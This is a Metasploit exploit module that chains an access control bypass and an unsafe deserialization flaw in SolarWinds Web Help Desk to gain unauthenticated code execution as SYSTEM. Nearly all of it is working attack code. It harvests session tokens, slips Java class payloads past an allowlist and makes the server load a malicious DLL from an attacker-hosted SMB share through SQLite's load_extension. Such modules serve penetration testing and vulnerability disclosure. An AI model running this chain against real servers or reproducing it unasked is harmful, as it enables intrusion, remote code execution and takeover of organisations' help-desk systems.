##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SMB::Server::Share
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SolarWinds Web Help Desk unauthenticated RCE',
        'Description' => %q{
          This module exploits an access control bypass vulnerability (CVE-2025-40536) and an unsafe deserialization
          vulnerability (CVE-2025-40551) to achieve unauthenticated RCE against a vulnerable SolarWinds Web Help Desk
          server.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Jimi Sebree', # Original finder @ horizon3.ai
          'sfewer-r7' # MSF module (Based on the Nuclei template by horizon3.ai)
        ],
        'References' => [
          # Access control bypass vulnerability
          ['CVE', '2025-40536'],
          # Unsafe deserialization for RCE
          ['CVE', '2025-40551'],
          # Vendor advisory
          ['URL', 'https://documentation.solarwinds.com/en/success_center/whd/content/release_notes/whd_2026-1_release_notes.htm'],
          # Technical analysis from horizon3.ai
          ['URL', 'https://horizon3.ai/attack-research/cve-2025-40551-another-solarwinds-web-help-desk-deserialization-issue/']
        ],
        'DisclosureDate' => '2026-01-28',
        'Privileged' => true, # Runs as "NT AUTHORITY\SYSTEM" by default on a Windows install.
        'Platform' => ['win'],
        'Arch' => [ARCH_X86, ARCH_X64],
        'Targets' => [
          [
            'Windows (Native code dropper)', {
              'Platform' => 'win',
              'Arch' => [ARCH_X86, ARCH_X64]
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SERVICE_RESTARTS],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS] # C:\Program Files\WebHelpDesk\log\whd.log
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])

    # We generate these automatically, so deregister then here.
    deregister_options('SHARE', 'FILE_NAME', 'FOLDER_NAME')
  end

  def check
    session_ctx = step1_initial_session

    CheckCode::Vulnerable("Detected Web Help Desk version #{session_ctx[:version]} (#{session_ctx[:platform]}).")
  rescue Msf::Exploit::Failed => e
    CheckCode::Unknown(e.to_s)
  end

  def setup
    # NOTE: You have to run MSF as root so you can bind to this low port (and open it in your firewall).
    if datastore['SRVPORT'] != 445
      fail_with(Failure::BadConfig, 'SRVPORT must be 445 to serve a file over SMB')
    end

    super
  end

  def start_service
    print_status('Step 0 - Starting SMB service...')

    self.file_name += '.dll'

    self.file_contents = generate_payload_dll

    super
  end

  def primer
    print_status("Malicious SQLite extension UNC: #{unc}")

    print_status('Step 1 - Initial session...')

    session_ctx = step1_initial_session

    case target['Platform']
    when 'win'
      fail_with(Failure::BadConfig, "Remote target is running on #{session_ctx[:platform]} but Metasploit target platform is #{target['Platform']}") unless session_ctx[:platform] == :windows
      # TODO: when 'linux', 'unix'
    end

    print_status('Step 2 - Login pref page...')

    external_auth_container = step2_login_pref_page(session_ctx)

    print_status('Step 3 - Trigger SAML object...')

    step3_trigger_saml_object(session_ctx, external_auth_container)

    print_status('Step 4 - Create JSON RPC bridge...')

    jsonrpc_client = step4_create_jsonrpc_bridge(session_ctx)

    print_status('Step 5 - Registering the org.sqlite.JDBC driver...')

    # We first need to registering the org.sqlite.JDBC driver so we can use it, as it may have not already
    # been registered. By instantiating org.sqlite.JDBC, the classes static initializer will register the driver.
    json_data = {
      'javaClass' => 'org.sqlite.JDBC'
    }

    step5_trigger_unsafe_deserialization(session_ctx, jsonrpc_client, json_data)

    # let the driver load
    Rex::ThreadSafe.sleep(3)

    print_status('Step 6 - Loading malicious extension over SMB...')

    # With the org.sqlite.JDBC driver available, we leverage com.zaxxer.hikari.HikariDataSource to create a sqlite
    # connection. We use a sqlite in-memory database to avoid touching disk, and we leverage the enable_load_extension
    # pragma to allow us to load arbitrary native code extensions. Hikari allows us to execute arbitrary SQL statement
    # when a new database connection is opened. We use this to load a malicious extension that contains a Metasploit
    # native code payload.
    # Tested against Web Help Desk version 12.8.8.2528 running on Windows Server 2022 (NOTE: If you are using
    # the default Metasploit payloads you will have to disable Defender while testing, alternatively bring your
    # own payloads).
    json_data = {
      'javaClass' => 'com.zaxxer.hikari.HikariDataSource',
      'driverClassName' => 'org.sqlite.SQLiteDataSource',
      'jdbcUrl' => 'jdbc:sqlite::memory:?enable_load_extension=true',
      'connectionInitSql' => "SELECT load_extension('#{unc}');"
    }

    step5_trigger_unsafe_deserialization(session_ctx, jsonrpc_client, json_data, return_early: true)

    cleanup_service
  end

  def step1_initial_session
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'helpdesk', 'WebObjects', 'Helpdesk.woa'),
      'headers' => {
        'x-webobjects-recording' => '1'
      }
    )

    fail_with(Failure::UnexpectedReply, 'Step 1 - Connection failed') unless res

    fail_with(Failure::UnexpectedReply, "Step 1 - Unexpected response code #{res.code}") unless res.code == 200

    m = res.body.match(%r{"/helpdesk/\w+/\w+\.css\?v=([\d_]+)"})

    fail_with(Failure::UnexpectedReply, 'Step 1 - Failed to extract version') unless m

    version = m[1].gsub('_', '.')

    vprint_status("Version: #{version}")

    m = res.body.match(%r{src="/helpdesk/WebObjects/Helpdesk\.woa/wr\?wodata=(jar[^"]+)"})

    fail_with(Failure::UnexpectedReply, 'Step 1 - Failed to extract resource path') unless m

    resource_path = Rex::Text.uri_decode(m[1])

    # jar:file:////C:/Program%20Files/WebHelpDesk/bin/webapps/helpdesk/WEB-INF/lib/Ajax.jar!/WebServerResources/prototype.js
    platform = resource_path =~ %r{file:////.:/} ? :windows : :unix

    vprint_status("Platform: #{platform}")

    cookies = res.get_cookies

    jsessionid = cookies.scan(/JSESSIONID=([A-Za-z0-9]+);*/).flatten[0] || nil

    fail_with(Failure::UnexpectedReply, 'Step 1 - Failed to get JSESSIONID') unless jsessionid

    vprint_status("JSESSIONID: #{jsessionid}")

    xsrf_token = cookies.scan(/XSRF-TOKEN=([A-Za-z0-9-]+);*/).flatten[0] || nil

    fail_with(Failure::UnexpectedReply, 'Step 1 - Failed to get XSRF-TOKEN') unless xsrf_token

    vprint_status("XSRF-TOKEN: #{xsrf_token}")

    x_webobjects_session_id = res.headers['x-webobjects-session-id']&.to_s

    fail_with(Failure::UnexpectedReply, 'Step 1 - Failed to get x-webobjects-session-id') unless x_webobjects_session_id

    vprint_status("x-webobjects-session-id: #{x_webobjects_session_id}")

    {
      version: version,
      platform: platform,
      jsessionid: jsessionid,
      xsrf_token: xsrf_token,
      x_webobjects_session_id: x_webobjects_session_id
    }
  end

  def step2_login_pref_page(session_ctx)
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'helpdesk', 'WebObjects', 'Helpdesk.woa', 'wo', "#{Rex::Text.rand_text_alpha(8)}.wo", session_ctx[:x_webobjects_session_id], '1.0'),
      'headers' => {
        'X-Xsrf-Token' => session_ctx[:xsrf_token],
        'Cookie' => "JSESSIONID=#{session_ctx[:jsessionid]}"
      },
      'vars_get' => {
        Rex::Text.rand_text_alpha(8) => '/ajax/',
        'wopage' => 'LoginPref'
      }
    )

    fail_with(Failure::UnexpectedReply, 'Step 2 - Connection failed') unless res

    fail_with(Failure::UnexpectedReply, "Step 2 - Unexpected response code #{res.code}") unless res.code == 200

    m = res.body.match(%r{id="externalAuthContainer" updateUrl="/(helpdesk/WebObjects/Helpdesk\.woa/ajax/\d+\.\d+)})

    fail_with(Failure::UnexpectedReply, 'Step 2 - Failed to extract externalAuthContainer') unless m

    external_auth_container = m[1]

    vprint_status("externalAuthContainer: #{external_auth_container}")

    external_auth_container
  end

  def step3_trigger_saml_object(session_ctx, external_auth_container)
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, external_auth_container),
      'headers' => {
        'X-Xsrf-Token' => session_ctx[:xsrf_token],
        'Cookie' => "JSESSIONID=#{session_ctx[:jsessionid]}"
      },
      'data' => "0.7.1.3.1.0.0.0.1.1.0=1&_csrf=#{session_ctx[:xsrf_token]}"
    )

    fail_with(Failure::UnexpectedReply, 'Step 3 - Connection failed') unless res

    fail_with(Failure::UnexpectedReply, "Step 3 - Unexpected response code #{res.code}") unless res.code == 200
  end

  def step4_create_jsonrpc_bridge(session_ctx)
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'helpdesk', 'WebObjects', 'Helpdesk.woa', 'wo', "#{Rex::Text.rand_text_alpha(8)}.wo", session_ctx[:x_webobjects_session_id], '1.0'),
      'headers' => {
        'X-Xsrf-Token' => session_ctx[:xsrf_token],
        'Cookie' => "JSESSIONID=#{session_ctx[:jsessionid]}"
      },
      'vars_get' => {
        Rex::Text.rand_text_alpha(8) => '/ajax/',
        'wopage' => 'LoginPref'
      }
    )

    fail_with(Failure::UnexpectedReply, 'Step 4 - Connection failed') unless res

    fail_with(Failure::UnexpectedReply, "Step 4 - Unexpected response code #{res.code}") unless res.code == 200

    m = res.body.match(%r{JSONRpcClient\('/helpdesk/WebObjects/Helpdesk\.woa/ajax/([\d.]+)'\);})

    fail_with(Failure::UnexpectedReply, 'Step 4 - Failed to extract JSONRpcClient') unless m

    jsonrpc_client = m[1]

    vprint_status("JSONRpcClient: #{jsonrpc_client}")

    jsonrpc_client
  end

  def step5_trigger_unsafe_deserialization(session_ctx, jsonrpc_client, json_data, return_early: false)
    random_id = rand(1..0xffff)
    random_name = Rex::Text.rand_text_alpha(8)

    # whd-core.jar!com.macsdesign.util.MDSApplication.isWhitelisted
    allowlist = [
      'parentpopup', 'wonoselectionstring', 'dummy', 'mdssubmitlink', 'mdsform__enterkeypressed',
      'mdsform__shiftkeypressed', 'mdsform__altkeypressed', '_csrf'
    ]

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'helpdesk', 'WebObjects', 'Helpdesk.woa', 'wo', jsonrpc_client),
      'headers' => {
        'X-Xsrf-Token' => session_ctx[:xsrf_token],
        'Cookie' => "JSESSIONID=#{session_ctx[:jsessionid]}"
      },
      'data' => {
        Rex::Text.rand_text_alpha(8) => "java.#{allowlist.shuffle.join}",
        'id' => random_id,
        'method' => 'wopage.setVariableValueForName',
        'params' => [
          random_name,
          json_data
        ]
      }.to_json
    )

    fail_with(Failure::UnexpectedReply, 'Step 5A - Connection failed') unless res

    fail_with(Failure::UnexpectedReply, "Step 5A - Unexpected response code #{res.code}") unless res.code == 200

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'helpdesk', 'WebObjects', 'Helpdesk.woa', 'wo', jsonrpc_client),
      'headers' => {
        'X-Xsrf-Token' => session_ctx[:xsrf_token],
        'Cookie' => "JSESSIONID=#{session_ctx[:jsessionid]}"
      },
      'data' => {
        Rex::Text.rand_text_alpha(8) => "java.#{allowlist.shuffle.join}",
        'id' => random_id,
        'method' => 'wopage.variableValueForName',
        'params' => [random_name]
      }.to_json
    )

    unless return_early
      fail_with(Failure::UnexpectedReply, 'Step 5B - Connection failed') unless res

      fail_with(Failure::UnexpectedReply, "Step 5B - Unexpected response code #{res.code}") unless res.code == 200
    end
  end

end
